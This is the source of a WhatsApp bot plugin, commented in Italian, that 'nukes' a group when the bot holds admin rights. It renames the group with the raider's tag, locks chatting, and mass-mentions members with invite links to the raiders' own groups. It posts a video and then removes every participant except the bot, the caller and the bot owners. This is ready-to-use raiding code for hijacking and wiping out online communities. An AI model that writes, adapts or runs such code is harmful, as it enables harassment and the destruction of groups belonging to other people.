//Codice di OWNER-nuke.js

import fs from 'fs'
import path from 'path'

let handler = async (m, { conn }) => {
  if (!m.isGroup) return await conn.reply(m.chat, 'Questo comando funziona solo nei gruppi.', m)

  const botJid = conn.user?.jid || conn.user?.id || ''

  try {
    let metadata
    try {
      metadata = await conn.groupMetadata(m.chat)
    } catch {
      return await conn.reply(m.chat, 'Il bot deve essere amministratore.', m)
    }

    const oldTitle = metadata.subject || 'FALLITI'
    const newTitle = `${oldTitle} | 𝐒𝐕𝐓 𝐁𝐘 ✧ 𝐃𝐈𝐄𝐇 ✧`
    await conn.groupUpdateSubject(m.chat, newTitle).catch(() => null)

    await conn.groupSettingUpdate(m.chat, 'announcement').catch(() => null)


    const owners = global.owner?.map(o => o[0] + '@s.whatsapp.net') || []
    const mentions = metadata.participants
      .filter(p => p.id !== botJid && p.id !== m.sender && !owners.includes(p.id))
      .map(p => p.id)

    await conn.sendMessage(m.chat, {
      text: `╔═════════════════╗
║『𝐆𝐑𝐔𝐏𝐏𝐎 𝐍𝐔𝐊𝐊𝐀𝐓𝐎』 ║
╚═════════════════╝

*𝐂𝐈 𝐓𝐑𝐀𝐒𝐅𝐄𝐑𝐈𝐀𝐌𝐎 𝐐𝐔𝐀* ⇩

https://chat.whatsapp.com/DwiVCgiaf6O5xDsdBDog8h

(neon)
https://chat.whatsapp.com/BwlQHBV2jSFGCOszwgxQ0V`,
      mentions: mentions.concat(m.sender)
    }, { quoted: m })


    const videoPath = path.join(process.cwd(), 'media', 'nuke.mp4')
    if (!fs.existsSync(videoPath)) {
      return await conn.reply(m.chat, '❌ ERRORE: manca il file *nuke.mp4* ', m)
    }

    await conn.sendMessage(m.chat, {
      video: fs.readFileSync(videoPath),
      caption: '🔥',
      gifPlayback: true
    }, { quoted: m })


    if (mentions.length > 0) {
      await conn.groupParticipantsUpdate(m.chat, mentions, 'remove').catch(() => null)
    }

  } catch (e) {}
}

handler.help = ['nuke']
handler.tags = ['owner']
handler.command = /^(annientare)$/i
handler.group = true
handler.botAdmin = true
handler.sam = true

export default handler